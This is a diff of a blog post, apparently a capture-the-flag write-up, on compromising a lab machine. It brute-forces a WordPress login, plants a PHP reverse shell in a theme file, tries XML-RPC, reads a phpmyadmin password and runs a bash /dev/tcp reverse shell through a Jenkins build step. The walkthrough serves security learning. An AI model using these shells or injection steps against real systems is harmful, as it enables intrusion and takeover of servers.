@@ -17,7 +17,8 @@ Sep. 16, 2020
 <p>PS: I been really busy at work these past days and seems to it&rsquo;ll be the same for the next few weeks. That being said, I still owe you (me? yep) the pentesting report for the last room we solved called <a href="https://www.tzero86bits.tk/posts/relevant/">Relevant</a>. I&rsquo;d like to also work on the report for this one, so in all fairness I&rsquo;ll owe you two. Will try to get those done relatively soon. I promise. :smile:</p>
 <h2 id="stage-1---pre-engagement-interactions">Stage 1 - Pre-engagement Interactions</h2>
 <blockquote>
-<p>&ldquo;One over-looked step to penetration testing is pre-engagement interactions or scoping. During this pre-phase, a penetration testing company will outline the logistics of the test, expectations, legal implications, objectives and goals the customer would like to achieve.&rdquo;</p></blockquote>
+<p>&ldquo;One over-looked step to penetration testing is pre-engagement interactions or scoping. During this pre-phase, a penetration testing company will outline the logistics of the test, expectations, legal implications, objectives and goals the customer would like to achieve.&rdquo;</p>
+</blockquote>
 <p>The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:</p>
 <ul>
 <li>User.txt</li>
@@ -33,7 +34,8 @@ Sep. 16, 2020
 </ul>
 <h2 id="stage-2---reconnaissance">Stage 2 - Reconnaissance</h2>
 <blockquote>
-<p>&ldquo;Reconnaissance or Open Source Intelligence (OSINT) gathering is an important first step in penetration testing. A pentester works on gathering as much intelligence on your organization and the potential targets for exploit.&rdquo; <em>from <a href="https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/">Cipher.com</a></em></p></blockquote>
+<p>&ldquo;Reconnaissance or Open Source Intelligence (OSINT) gathering is an important first step in penetration testing. A pentester works on gathering as much intelligence on your organization and the potential targets for exploit.&rdquo; <em>from <a href="https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/">Cipher.com</a></em></p>
+</blockquote>
 <p>We need to make sure we update our <code>hosts</code> file with the domain for this target machine. For that we simply run nano as sudo and update the file as follows:</p>
 <p><img src="https://i.imgur.com/WRwyePT.png" alt="We update the hosts file"></p>
 <p>And to verify we are good to go we perform a <code>ping</code> on <code>internal.thm</code>:</p>
@@ -192,7 +194,8 @@ Let&rsquo;s look into <code>whatweb</code> results logged by <code>autorecon</co
 <p>I&rsquo;m gonna get some sleep, it&rsquo;s really late and work has been super tyring these days. We&rsquo;ll pick it up tomorrow. (yep, I talk to myself a lot.)</p>
 <h2 id="stage-3---threat-modeling--vulnerability-identification">Stage 3 - Threat Modeling &amp; Vulnerability Identification</h2>
 <blockquote>
-<p>&ldquo;During the threat modeling and vulnerability identification phase, the tester identifies targets and maps the attack vectors. Any information gathered during the Reconnaissance phase is used to inform the method of attack during the penetration test.&rdquo; <em>from <a href="https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/">Cipher.com</a></em></p></blockquote>
+<p>&ldquo;During the threat modeling and vulnerability identification phase, the tester identifies targets and maps the attack vectors. Any information gathered during the Reconnaissance phase is used to inform the method of attack during the penetration test.&rdquo; <em>from <a href="https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/">Cipher.com</a></em></p>
+</blockquote>
 <h3 id="wordpress-login---bruteforce">Wordpress Login - Bruteforce</h3>
 <p>We have a possible username for wordpress called <code>admin</code>, we can try to attempt some brutefocing with <code>wpscan</code> to see if we manage to get past wordpress login form.</p>
 <p>We fire up <code>wpscan</code> like this:</p>
@@ -210,12 +213,14 @@ Let&rsquo;s look into <code>whatweb</code> results logged by <code>autorecon</co
 <p><img src="https://i.imgur.com/5tIWgvM.png" alt="Private post"></p>
 <p>We&rsquo;ll have that in mind. Anyways, from here on we can potentially try to gain access in a couple of ways, the one I&rsquo;m familiar is with trying to upload/modify a certain file that can give us a reverse shell connection. Let&rsquo;s see if we can manage to do that.</p>
 <blockquote>
-<p>At this point another piece of information from the <code>wpscan</code> results came to my attention. There was a mention of an outdated theme. I know there are theme vulnerabilities out there, that could be another way in. We&rsquo;ll have that in mind.</p></blockquote>
+<p>At this point another piece of information from the <code>wpscan</code> results came to my attention. There was a mention of an outdated theme. I know there are theme vulnerabilities out there, that could be another way in. We&rsquo;ll have that in mind.</p>
+</blockquote>
 <p>We&rsquo;ll try to get a one-liner php reverse shell to run inside one of the php pages that wordpress runs.</p>
 <p>First we prepare our reverse shell: <code>php -r '$sock=fsockopen(getenv(&quot;10.13.0.34&quot;),getenv(&quot;2112&quot;));exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>
 <p>We&rsquo;ll use our lucky port <code>2112</code>. Now we need to see where we can inject this code to make it run.</p>
 <blockquote>
-<p>Remember to start <code>nc -nlvp 2112</code>.</p></blockquote>
+<p>Remember to start <code>nc -nlvp 2112</code>.</p>
+</blockquote>
 <p>Ideally we need to locate a file that gets loaded by wordpress by default or we could also try to inject the code into one of the files that gets loaded by the theme that&rsquo;s currently set as active. Let&rsquo;s try this one first since wodpress provides a nice way of editing the active theme files directly in the admin panel.</p>
 <p><img src="https://i.imgur.com/2NUlDOa.png" alt="We locate our target wordpress theme file"></p>
 <p>If we look at the available theme files, we see one called <code>Main Index Template index.php</code>. Let&rsquo;s pick that one to host our payload. We just add our one-liner reverse shell inside the <code>&lt;?php ----file content---- ?&gt;</code> tags:</p>
@@ -237,7 +242,8 @@ Let&rsquo;s look into <code>whatweb</code> results logged by <code>autorecon</co
 <p><img src="https://i.imgur.com/iEKyBN0.png" alt="reverse Shell"></p>
 <h3 id="xml-rpc">XML-RPC</h3>
 <blockquote>
-<p>XML-RPC is an API that warps the information or data into XML file and sends it to the mobile app or remote software. This was introduced as in the olden days, internet speed is not fast, instead of writing it online. Users writes their content offline and publish all together using the API. As the internet services improved, most of us does not use the feature anymore, often it was forgotten by us. <em>from <a href="hhttps://bsderek.home.blog/2020/01/06/exploiting-the-xmlrpc-php/">Cipher.com</a></em></p></blockquote>
+<p>XML-RPC is an API that warps the information or data into XML file and sends it to the mobile app or remote software. This was introduced as in the olden days, internet speed is not fast, instead of writing it online. Users writes their content offline and publish all together using the API. As the internet services improved, most of us does not use the feature anymore, often it was forgotten by us. <em>from <a href="hhttps://bsderek.home.blog/2020/01/06/exploiting-the-xmlrpc-php/">Cipher.com</a></em></p>
+</blockquote>
 <p>Let&rsquo;s start with the possible attacks against <code>XML-RPC enabled</code> in the installed Wordpress version.</p>
 <p>The idea here is simple at least for this first attempt, we&rsquo;ll create a simple <code>XML</code> file that will ping back to us</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;iso-8859-1&#34;?&gt;</span>
@@ -281,7 +287,8 @@ Let&rsquo;s look into <code>whatweb</code> results logged by <code>autorecon</co
 </span></span></code></pre></div><p>This seems like a dead end.</p>
 <h2 id="stage-4---exploitation">Stage 4 - Exploitation</h2>
 <blockquote>
-<p>&ldquo;With a map of all possible vulnerabilities and entry points, the pentester begins to test the exploits found within your network, applications, and data. The goal is for the ethical hacker is to see exactly how far they can get into your environment, identify high-value targets, and avoid any detection.&rdquo; <em>from <a href="https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/">Cipher.com</a></em></p></blockquote>
+<p>&ldquo;With a map of all possible vulnerabilities and entry points, the pentester begins to test the exploits found within your network, applications, and data. The goal is for the ethical hacker is to see exactly how far they can get into your environment, identify high-value targets, and avoid any detection.&rdquo; <em>from <a href="https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/">Cipher.com</a></em></p>
+</blockquote>
 <p>We now have our initial foothold on the server, we managed to get a reverse shell connection by:</p>
 <ol>
 <li>Bruteforcing our way into Wordpress admin panel.</li>
@@ -297,7 +304,7 @@ Let&rsquo;s look into <code>whatweb</code> results logged by <code>autorecon</co
 <p>Ok let&rsquo;s do some manual browsing then. After a while of browsin the various folders we can access, there is one location that contains a <code>config-db.php</code> file with some information:</p>
 <p><img src="https://i.imgur.com/sUarihU.png" alt="config-db file"></p>
 <p>we get some credentials for <code>phpmyadmin</code>:</p>
-<p><code> $dbuser='phpmyadmin'; $dbpass='B2Ud4fEOZmVq'; $basepath=''; $dbname='phpmyadmin'; $dbserver='localhost'; $dbport='3306'; $dbtype='mysql'; </code></p>
+<p><code>$dbuser='phpmyadmin'; $dbpass='B2Ud4fEOZmVq'; $basepath=''; $dbname='phpmyadmin'; $dbserver='localhost'; $dbport='3306'; $dbtype='mysql';</code></p>
 <p>Let&rsquo;s see if maybe we can log into <code>/phpmyadmin</code> with those credentials:</p>
 <p><img src="https://i.imgur.com/qcPcfqP.png" alt="we access phpmyadmin"></p>
 <p>Let&rsquo;s continue searching for any other interesting files. At the <code>opt</code> directory there is a file that gives us another set of credentials. This time for <code>aubreanna</code> which was a user folder we could not access when browsing around. we also got a mention of someone called <code>Bill</code>.</p>
@@ -330,7 +337,8 @@ We could try to bruteforce our way in. Let&rsquo;s see if we attempt a login wit
 <p>Inside that <code>Execute shell</code> text box, we&rsquo;ll add a reverse shell connection script. We&rsquo;ll try with a bash reverse shell:</p>
 <p><code>bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.13.0.34/2112 &lt;&amp;1'</code> we simply paste this into the <code>command</code> text field int he <code>execute shell</code> block. Once done we simply click save to apply the changes.</p>
 <blockquote>
-<p>Remember to <code>nc -nlvp 2112</code></p></blockquote>
+<p>Remember to <code>nc -nlvp 2112</code></p>
+</blockquote>
 <p>Now we just need to go back to the jenkins dashboard and we should see a new job listed for which we can now trigger a new build. Let&rsquo;ts do that:</p>
 <p><img src="https://i.imgur.com/VMhhnWT.png" alt="jenkins job ready"></p>
 <p>Once the job runs we should get the reverse shell connection, assuming all goes well:</p>
